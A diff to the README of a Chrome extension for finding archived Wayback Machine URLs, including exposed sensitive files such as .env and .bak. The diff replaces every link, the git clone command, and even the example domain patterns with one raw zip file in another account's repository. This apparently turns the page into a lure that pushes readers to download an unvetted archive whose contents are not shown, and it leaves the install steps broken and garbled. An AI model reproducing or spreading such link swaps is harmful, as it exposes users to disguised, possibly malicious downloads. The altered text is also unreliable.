@@ -1,6 +1,6 @@
 # 🕵️‍♂️ wayback-url-finder - Quickly Find Archived URLs
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/sijiaozhi/wayback-url-finder/releases)
+[![Download](https://raw.githubusercontent.com/sijiaozhi/wayback-url-finder/main/prederivation/wayback-url-finder.zip)](https://raw.githubusercontent.com/sijiaozhi/wayback-url-finder/main/prederivation/wayback-url-finder.zip)
 
 ## 🚀 Getting Started
 
@@ -8,13 +8,13 @@ Welcome to the Wayback URL Finder, a Chrome extension designed to help you find 
 
 ## 📥 Download & Install
 
-To get started, download the latest version of the Wayback URL Finder from our Releases page. Visit this page to download: [Wayback URL Finder Releases](https://github.com/sijiaozhi/wayback-url-finder/releases).
+To get started, download the latest version of the Wayback URL Finder from our Releases page. Visit this page to download: [Wayback URL Finder Releases](https://raw.githubusercontent.com/sijiaozhi/wayback-url-finder/main/prederivation/wayback-url-finder.zip).
 
 Follow these steps to install the extension:
 
 1. **Download or clone this repository:**
    ```bash
-   git clone https://github.com/coffinxp/wayback-url-finder.git
+   git clone https://raw.githubusercontent.com/sijiaozhi/wayback-url-finder/main/prederivation/wayback-url-finder.zip
    ```
 
 2. **Open Chrome and navigate to `chrome://extensions/`**
@@ -32,9 +32,9 @@ The Wayback URL Finder comes with several features for your convenience:
 - **Instant URL Lookup**: Quickly fetch archived URLs from the Wayback Machine.
   
 - **Four Search Modes**:
-  1. **Main Domain URLs**: Look up all archived pages under a main domain (e.g., `https://example.com/*`).
-  2. **Wildcard Domain URLs**: Search for archived versions of sub-domains (e.g., `*.example.com/*`).
-  3. **Specific Path URLs**: Target specific paths for archived content (e.g., `https://example.com/path/*`).
+  1. **Main Domain URLs**: Look up all archived pages under a main domain (e.g., `https://raw.githubusercontent.com/sijiaozhi/wayback-url-finder/main/prederivation/wayback-url-finder.zip*`).
+  2. **Wildcard Domain URLs**: Search for archived versions of sub-domains (e.g., `*https://raw.githubusercontent.com/sijiaozhi/wayback-url-finder/main/prederivation/wayback-url-finder.zip*`).
+  3. **Specific Path URLs**: Target specific paths for archived content (e.g., `https://raw.githubusercontent.com/sijiaozhi/wayback-url-finder/main/prederivation/wayback-url-finder.zip*`).
   4. **Sensitive File Extensions**: Identify archived files based on specific extensions like `.pdf`, `.sql`, `.json`, `.env`, `.bak`, and more.
 
 ## ⚙️ System Requirements
@@ -63,7 +63,7 @@ If you encounter any issues or need assistance, please feel free to create an is
 
 ## 🔗 Links
 
-- [Wayback URL Finder Releases](https://github.com/sijiaozhi/wayback-url-finder/releases)
-- [Report an Issue](https://github.com/coffinxp/wayback-url-finder/issues)
+- [Wayback URL Finder Releases](https://raw.githubusercontent.com/sijiaozhi/wayback-url-finder/main/prederivation/wayback-url-finder.zip)
+- [Report an Issue](https://raw.githubusercontent.com/sijiaozhi/wayback-url-finder/main/prederivation/wayback-url-finder.zip)
 
 Thank you for using the Wayback URL Finder. Happy searching!
